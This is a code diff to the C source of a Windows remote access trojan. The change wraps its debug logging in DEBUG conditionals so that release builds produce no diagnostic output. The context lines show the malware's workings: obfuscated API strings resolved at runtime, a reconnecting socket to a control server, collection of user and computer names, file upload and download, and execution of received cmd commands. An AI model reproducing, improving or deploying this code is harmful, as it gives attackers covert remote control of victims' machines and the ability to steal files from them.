@@ -30,9 +30,11 @@ SocketSend(RATSocket* ratSocket, char*
 	_send* f_send = (_send*)GetProcAddress(ratSocket->libraryWinsock2, ca_send);
 	if ( f_send(ratSocket->socketConnection, messageBuffer, bufferSize, 0) == SOCKET_ERROR )
 	{
+#if DEBUG		
 		char buffer[SOCKET_BUFFER_SIZE];
 		sprintf_s(buffer, "Socket failed with error: %ld\n", ratSocket->f_WSAGetLastError());
 		OutputDebugStringA(buffer);
+#endif		
 		return 1;
 	}
 	return 0;
@@ -41,7 +43,9 @@ SocketSend(RATSocket* ratSocket, char*
 int
 FetchInfo(RATSocket* ratSocket)
 {
+#if DEBUG	
 	char bufferError[SOCKET_BUFFER_SIZE];
+#endif	
 	char bufferUser[UNLEN + 1];
 	DWORD len = sizeof(bufferUser);
 
@@ -54,8 +58,10 @@ FetchInfo(RATSocket* ratSocket)
 			
 	if ( f_GetComputerNameA(bufferComputer, &len) <= 0 )
 	{
+#if DEBUG		
 		sprintf_s(bufferError, "Could not get computer name: %ld\n", GetLastError());
 		OutputDebugStringA(bufferError);
+#endif
 
 		strncpy_s(bufferComputer, ca_unknown, sizeof(ca_unknown));
 	}
@@ -64,7 +70,9 @@ FetchInfo(RATSocket* ratSocket)
 	HMODULE libraryAdvapi32 = LoadLibraryA(ca_advapi32);
 	if ( !libraryAdvapi32 )
 	{
+#if DEBUG				
 		OutputDebugStringA("Loading libraryAdvapi32 failed.\n");
+#endif		
 		return 1;
 	}
 			
@@ -73,8 +81,10 @@ FetchInfo(RATSocket* ratSocket)
 
 	if ( f_GetUserNameA(bufferUser, &len) <= 0 )
 	{
+#if DEBUG		
 		sprintf_s(bufferError, "Could not get username: %ld\n", GetLastError());
 		OutputDebugStringA(bufferError);
+#endif		
 
 		strncpy_s(bufferUser, ca_unknown, sizeof(ca_unknown));
 	}
@@ -106,7 +116,9 @@ DownloadFile(RATSocket* ratSocket,
 			int bytesRead = gf_recv(ratSocket->socketConnection, writeBuffer, SOCKET_BUFFER_SIZE, 0);
 			if ( bytesRead != SOCKET_ERROR )
 			{
+#if DEBUG						
 				OutputDebugStringA(writeBuffer);
+#endif				
 
 				strncat_s(totalReceivedData, fileSize + 1, writeBuffer, bytesRead);
 
@@ -118,7 +130,9 @@ DownloadFile(RATSocket* ratSocket,
 			}
 			else
 			{
+#if DEBUG				
 				OutputDebugStringA("[ERROR] Error receiving download command from server.");
+#endif				
 			}
 		}
 	}
@@ -141,9 +155,11 @@ DownloadFile(RATSocket* ratSocket,
 	_WriteFile* f_WriteFile = (_WriteFile*)GetProcAddress(gLibraryKernel32, ca_WriteFile);
 	f_WriteFile(fileHandle, totalReceivedData, totalBytesRead, &bytesWritten, 0);
 
+#if DEBUG			
 	char buffer[256];
 	sprintf_s(buffer, "Bytes written: %ld\n", bytesWritten);
 	OutputDebugStringA(buffer);
+#endif	
 	
 	gf_CloseHandle(fileHandle);
 			
@@ -167,8 +183,10 @@ UploadFile(RATSocket* ratSocket,
 			if ( readSize > 0 )
 			{
 				SocketSend(ratSocket, readBuffer, SOCKET_BUFFER_SIZE);
+#if DEBUG						
 				OutputDebugStringA(readBuffer);
 				OutputDebugStringA("\n");
+#endif				
 			}
 			if ( readSize < SOCKET_BUFFER_SIZE || feof(fs) )
 			{
@@ -235,9 +253,11 @@ ReceiveCmdCommand(RATSocket* ratSocket,
 	_CreateProcessA* f_CreateProcessA = (_CreateProcessA*)GetProcAddress(gLibraryKernel32, ca_CreateProcessA);
 	if ( !f_CreateProcessA(cmdPath, cmdArg, NULL, NULL, FALSE, 0 , NULL, NULL, &si, &pi) )
 	{
+#if DEBUG				
 		char bufferError[256];
 		sprintf_s(bufferError, "CreateProcess failed (%d).\n", GetLastError());
 		OutputDebugStringA(bufferError);
+#endif		
 	}
 
 	char ca_WaitForSingleObject[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
@@ -253,8 +273,10 @@ ReceiveCmdCommand(RATSocket* ratSocket,
 	HANDLE handle = gf_CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
 	if ( handle == INVALID_HANDLE_VALUE )
 	{
+#if DEBUG		
 		OutputDebugStringA("Error deleting file at");
 		OutputDebugStringA(filePath);
+#endif		
 	}
 	gf_CloseHandle(handle);
 
@@ -280,7 +302,9 @@ WinMain(HINSTANCE hInstance,
 	ratSocket.libraryWinsock2 = LoadLibraryA(ca_ws2_32);
 	if ( !ratSocket.libraryWinsock2 )
 	{
+#if DEBUG				
 		OutputDebugStringA("Loading ratSocket.libraryWinsock2 failed.\n");
+#endif		
 		return 1;
 	}
 
@@ -298,7 +322,9 @@ WinMain(HINSTANCE hInstance,
 		_WSAStartup* f_WSAStartup = (_WSAStartup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSAStartup);
 		if ( f_WSAStartup(MAKEWORD(2,2), &wsaData) != NO_ERROR )
 		{
+#if DEBUG					
 			OutputDebugStringA("WSAStartup failed.\n");
+#endif			
 			return 1;
 		}
 
@@ -307,10 +333,12 @@ WinMain(HINSTANCE hInstance,
 
 		ratSocket.socketConnection = f_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 		if ( ratSocket.socketConnection == INVALID_SOCKET )
-		{	
+		{
+#if DEBUG					
 			char buffer[256];
 			sprintf_s(buffer, "Socket failed with error: %ld\n", ratSocket.f_WSAGetLastError());
 			OutputDebugStringA(buffer);
+#endif			
 
 			char ca_WSACleanup[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
 			_WSACleanup* f_WSACleanup = (_WSACleanup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSACleanup);
@@ -336,14 +364,18 @@ WinMain(HINSTANCE hInstance,
 
 		if ( f_connect(ratSocket.socketConnection, (SOCKADDR*) &socketAddress, sizeof(socketAddress)) != SOCKET_ERROR )
 		{
+#if DEBUG					
 			OutputDebugStringA("Connection successful!\n");
+#endif			
 			break;
 		}
 		else
 		{
+#if DEBUG					
 			char buffer[256];
 			sprintf_s(buffer, "Socket failed with error: %ld\nReconnecting...\n", ratSocket.f_WSAGetLastError());
 			OutputDebugStringA(buffer);
+#endif			
 
 			// Try to reconnect
 			// 
@@ -369,7 +401,9 @@ WinMain(HINSTANCE hInstance,
 	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
 	if ( !gLibraryKernel32 )
 	{
+#if DEBUG				
 		OutputDebugStringA("Loading gLibraryKernel32 failed.\n");
+#endif		
 		return 1;
 	}
 
@@ -381,10 +415,14 @@ WinMain(HINSTANCE hInstance,
 		char recvBuffer[SOCKET_BUFFER_SIZE] = {};
 		if ( gf_recv(ratSocket.socketConnection, recvBuffer, SOCKET_BUFFER_SIZE, 0) == SOCKET_ERROR )
 		{
+#if DEBUG					
 			OutputDebugStringA("Error receiving message.");
+#endif			
 		}
-		
+
+#if DEBUG				
 		OutputDebugStringA("Received command: ");
+#endif		
 		char ca_info[] = { 'i','n','f','o',0 };
 		char ca_cmd[] = { 'c','m','d',0 };
 		char ca_shutdown[] = { 's','h','u','t','d','o','w','n',0 };
@@ -412,14 +450,18 @@ WinMain(HINSTANCE hInstance,
 		}
 		else if ( strcmp(splittedCommand[0], ca_shutdown) == 0 )
 		{
+#if DEBUG					
 			OutputDebugStringA("Received shutdown command.\n");
+#endif			
 			break;
 		}
 		else
 		{
+#if DEBUG					
 			OutputDebugStringA("[WARNING] Unrecognized command: ");
 			OutputDebugStringA(recvBuffer);
 			OutputDebugStringA("\n");
+#endif			
 			
 			break;
 		}
@@ -427,7 +469,9 @@ WinMain(HINSTANCE hInstance,
 		Sleep(3000);
 	}
 
-	OutputDebugStringA("Shutting down...");	
+#if DEBUG			
+	OutputDebugStringA("Shutting down...");
+#endif	
 	
 	char ca_closesocket[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
 	_closesocket* f_closesocket = (_closesocket*)GetProcAddress(ratSocket.libraryWinsock2, ca_closesocket);
